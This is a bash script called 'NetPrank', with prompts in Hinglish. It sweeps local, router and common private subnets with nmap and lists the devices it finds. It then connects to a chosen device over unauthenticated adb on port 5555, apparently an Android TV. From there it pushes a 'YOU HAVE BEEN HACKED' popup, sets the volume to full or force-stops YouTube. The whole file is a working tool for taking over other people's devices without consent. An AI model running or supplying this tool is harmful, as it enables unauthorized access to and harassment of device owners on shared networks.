#!/bin/bash

# ========== Banner ==========
clear
figlet "NetPrank"
echo "======================================="
echo " Developer : Ajay Amar Chouhan"
echo " Version   : V 1.2"
echo "======================================="
echo

# Check dependencies
if ! command -v adb &> /dev/null; then
    echo "[!] adb install nahi hai. Pehle install karo: sudo apt install adb -y"
    exit 1
fi
if ! command -v nmap &> /dev/null; then
    echo "[!] nmap install nahi hai. Pehle install karo: sudo apt install nmap -y"
    exit 1
fi

# ====== SCAN MODE MENU ======
echo "Choose Scan Mode:"
echo "1) Local Network Scan"
echo "2) Router Network Scan"
echo "3) Other Network (manual subnet input)"
echo "4) Auto Detect (sab networks scan karo)"
read -p "Option (1-4): " scan_choice

scan_file="scan.txt"
> $scan_file   # clear old results

if [ "$scan_choice" == "1" ]; then
    SUBNET=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}/\d+' | head -n 1)
    echo "[*] Local Network Scan: $SUBNET"
    nmap -sn $SUBNET >> $scan_file

elif [ "$scan_choice" == "2" ]; then
    ROUTER_IP=$(ip route | grep default | awk '{print $3}')
    BASE=$(echo $ROUTER_IP | cut -d. -f1-3)
    SUBNET="$BASE.0/24"
    echo "[*] Router Network Scan: $SUBNET"
    nmap -sn $SUBNET >> $scan_file

elif [ "$scan_choice" == "3" ]; then
    read -p "Subnet daalo (jaise 192.168.1.0/24): " SUBNET
    echo "[*] Custom Network Scan: $SUBNET"
    nmap -sn $SUBNET >> $scan_file

elif [ "$scan_choice" == "4" ]; then
    echo "[*] Auto Detect Mode: Multiple networks scan ho rahe hain..."
    # Local subnet
    LOCAL_SUB=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}/\d+' | head -n 1)
    if [ ! -z "$LOCAL_SUB" ]; then
        echo "[*] Local: $LOCAL_SUB"
        nmap -sn $LOCAL_SUB >> $scan_file
    fi

    # Router subnet
    ROUTER_IP=$(ip route | grep default | awk '{print $3}')
    BASE=$(echo $ROUTER_IP | cut -d. -f1-3)
    ROUTER_SUB="$BASE.0/24"
    echo "[*] Router: $ROUTER_SUB"
    nmap -sn $ROUTER_SUB >> $scan_file

    # Extra common ranges
    echo "[*] Extra: 192.168.0.0/24"
    nmap -sn 192.168.0.0/24 >> $scan_file

    echo "[*] Extra: 10.0.0.0/24"
    nmap -sn 10.0.0.0/24 >> $scan_file
else
    echo "Galat choice! Exit..."
    exit 1
fi

# ====== SHOW DEVICES WITH MAC + VENDOR ======
echo
echo "====== Connected Devices ======"
i=1
while read -r line; do
    if [[ $line == *"Nmap scan report for"* ]]; then
        IP=$(echo $line | awk '{print $5}')
        HOST=$(echo $line | awk '{print $6}' | tr -d '()')
    fi
    if [[ $line == *"MAC Address:"* ]]; then
        MAC=$(echo $line | awk '{print $3}')
        VENDOR=$(echo $line | cut -d " " -f 4-)
    fi

    if [ -n "$IP" ]; then
        echo -n "$i) $IP"
        [ -n "$HOST" ] && echo -n "  ($HOST)"
        [ -n "$MAC" ] && echo -n " | MAC: $MAC"
        [ -n "$VENDOR" ] && echo -n " | Vendor: $VENDOR"
        echo

        ips[$i]=$IP
        i=$((i+1))
        IP=""
        HOST=""
        MAC=""
        VENDOR=""
    fi
done < $scan_file

if [ $i -eq 1 ]; then
    echo "[!] Koi device nahi mila!"
    exit 1
fi

echo "================================"
read -p "Konsa device choose karna hai (number): " choice
TV_IP=${ips[$choice]}

if [ -z "$TV_IP" ]; then
    echo "Galat choice! Exit..."
    exit 1
fi

read -p "Port number daalo (default 5555): " TV_PORT
TV_PORT=${TV_PORT:-5555}

echo "[*] Device se connect ho raha hoon: $TV_IP:$TV_PORT"
adb connect $TV_IP:$TV_PORT
adb devices

# ====== PRANK MENU LOOP ======
while true; do
    clear
    figlet "NetPrank"
    echo "======================================="
    echo " Developer : Ajay Amar Chouhan"
    echo " Version   : V 1.2"
    echo "======================================="
    echo
    echo "====== ANDROID TV PRANK MENU ======"
    echo "1) Popup Message (YOU HAVE BEEN HACKED)"
    echo "2) Volume Full"
    echo "3) Band Karo YouTube"
    echo "4) Disconnect & Exit"
    echo "===================================="
    read -p "Apna choice daalo (1-4): " option

    case $option in
        1)
            echo "[*] Popup bhej raha hoon..."
            adb shell am start -a android.intent.action.WEB_SEARCH --es query "YOU HAVE BEEN HACKED"
            ;;
        2)
            echo "[*] Volume full kar raha hoon..."
            adb shell media volume --set 15
            ;;
        3)
            echo "[*] YouTube band kar raha hoon..."
            adb shell am force-stop com.google.android.youtube.tv
            ;;
        4)
            echo "[*] Disconnect kar raha hoon aur exit..."
            adb disconnect $TV_IP:$TV_PORT
            exit 0
            ;;
        *)
            echo "Galat option! 1-4 select karo."
            ;;
    esac
    echo
    read -p "Enter dabao continue karne ke liye..."
done
